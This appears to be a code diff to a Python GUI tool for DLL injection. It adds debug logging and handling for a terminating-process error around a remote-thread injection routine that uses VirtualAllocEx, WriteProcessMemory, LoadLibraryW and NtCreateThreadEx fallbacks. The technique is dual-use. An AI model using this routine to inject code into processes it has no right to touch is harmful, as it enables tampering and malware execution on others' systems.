@@ -10,6 +10,7 @@ import os
 import sys
 import shutil
 import time
+import struct
 
 # Windows API constants
 PROCESS_ALL_ACCESS = 0x1F0FFF
@@ -723,10 +724,15 @@ class DLLInjectorGUI:
                 return False, None
 
             try:
+                # Log architecture and addresses
+                self.log(f"Injection Debug: Target 64bit={is_target_64}, Injector 64bit={struct.calcsize('P')==8}", "info")
+
                 dll_path_addr = kernel32.VirtualAllocEx(h_process, None, len(dll_path_bytes), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
                 if not dll_path_addr:
                     self.log(f"Injection: VirtualAllocEx failed. Error: {ctypes.get_last_error()}", "error")
                     return False, None
+                
+                self.log(f"Injection Debug: dll_path_addr=0x{dll_path_addr:X}", "info")
 
                 if not kernel32.WriteProcessMemory(h_process, dll_path_addr, dll_path_bytes, len(dll_path_bytes), None):
                      self.log(f"Injection: WriteProcessMemory failed. Error: {ctypes.get_last_error()}", "error")
@@ -737,6 +743,8 @@ class DLLInjectorGUI:
                 if not load_library_addr:
                     self.log(f"Injection: GetProcAddress(LoadLibraryW) failed. Error: {ctypes.get_last_error()}", "error")
                     return False, None
+                
+                self.log(f"Injection Debug: load_library_addr=0x{load_library_addr:X}", "info")
 
                 h_thread = kernel32.CreateRemoteThread(h_process, None, 0, load_library_addr, dll_path_addr, 0, None)
                 
@@ -754,6 +762,9 @@ class DLLInjectorGUI:
                     if status == 0: # STATUS_SUCCESS
                         h_thread = h_thread_val.value
                         self.log(f"Injection: NtCreateThreadEx SUCCESS (0x{h_thread:X})", "success")
+                    elif status == 0xC000010A:
+                        self.log(f"Injection: NtCreateThreadEx failed (0xC000010A - STATUS_PROCESS_IS_TERMINATING). The process is already closing/crashing.", "error")
+                        return False, None
                     else:
                         self.log(f"Injection: NtCreateThreadEx failed (0x{status:08X}). Trying RtlCreateUserThread...", "warning")
                         
